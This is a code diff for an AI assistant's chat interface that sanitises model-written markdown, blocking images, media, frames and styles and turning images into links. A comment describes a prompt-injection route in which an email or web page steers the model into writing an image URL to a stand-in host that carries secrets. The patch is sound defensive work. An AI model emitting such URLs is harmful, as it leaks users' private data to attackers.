@@ -18,9 +18,20 @@ import "./style.css";
 import "./game.css";
 
 const $ = <T extends HTMLElement>(sel: string) => document.querySelector<T>(sel)!;
-const md = (text: string) => {
+// Markdown from the model is untrusted: an email or web page can steer it into writing ![](https://x/?d=<secrets>),
+// which would leak data the moment the image loads. So no remote media, styles or frames are rendered from markdown;
+// an image becomes a link the user can choose to open (pictures Monkey searched for use their own card).
+const MD_SAFE = { FORBID_TAGS: ["img", "picture", "source", "video", "audio", "iframe", "object", "embed", "svg",
+                               "math", "style", "link", "form", "input", "image"],
+                  FORBID_ATTR: ["style", "srcset", "background", "poster", "formaction"] };
+const imagesToLinks = (html: string) => html.replace(/<img\b[^>]*>/gi, (tag) => {
+  const src = /\ssrc="([^"]*)"/i.exec(tag)?.[1] ?? "";
+  const alt = /\salt="([^"]*)"/i.exec(tag)?.[1] ?? "image";
+  return /^https?:/i.test(src) ? `<a href="${src}">🖼 ${alt || "image"} (open)</a>` : "";
+});
+export const md = (text: string) => {
   const div = h("div", { class: "md" });
-  div.innerHTML = DOMPurify.sanitize(marked.parse(text, { async: false }) as string);
+  div.innerHTML = DOMPurify.sanitize(imagesToLinks(marked.parse(text, { async: false }) as string), MD_SAFE);
   div.querySelectorAll("a").forEach((a) => a.addEventListener("click", (e) => { e.preventDefault(); api.open_url(a.href); }));
   return div;
 };
